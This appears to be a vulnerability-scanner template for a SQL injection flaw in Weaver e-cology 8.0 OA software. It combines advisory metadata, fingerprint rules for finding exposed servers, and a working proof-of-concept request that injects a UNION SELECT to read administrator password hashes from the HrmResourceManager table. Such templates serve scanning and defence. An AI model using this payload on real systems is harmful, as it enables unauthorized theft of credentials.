```
Name: 泛微OA 前台任意SQL语句执行
  Description: 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。
  Identifier:
    DVB: DVB-2023-4662
  VulnClass:
  - SQL注入
  Category:
  - 应用服务
  Manufacturer: 泛微网络
  Product: 泛微e-cology8.0
  Type: 1
  Status: 1
  Scanable: 1
  Level: 3
  DisclosureDate: '2023-06-12'
  Is0day: false
  IncludeExp: false
  Weakable: false
  IsXc: true
  IsCommon: false
  IsCallBack: false
  Condition: body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver"
    &amp;&amp; body="ecology") || (header="ecology_JSessionId" &amp;&amp; body="login/Login.jsp")
    || body="/wui/index.html" || body="jquery_wev8"
  Solutions:
  - 请关注厂商的修复版本，并及时更新到最新版本.
poc:
  relative: req0
  session: false
  requests:
  - method: GET
    timeout: 10
    path: /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/62.0.2426.8 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") &amp;&amp; body.regex("[0-9A-F]{32}"))
```

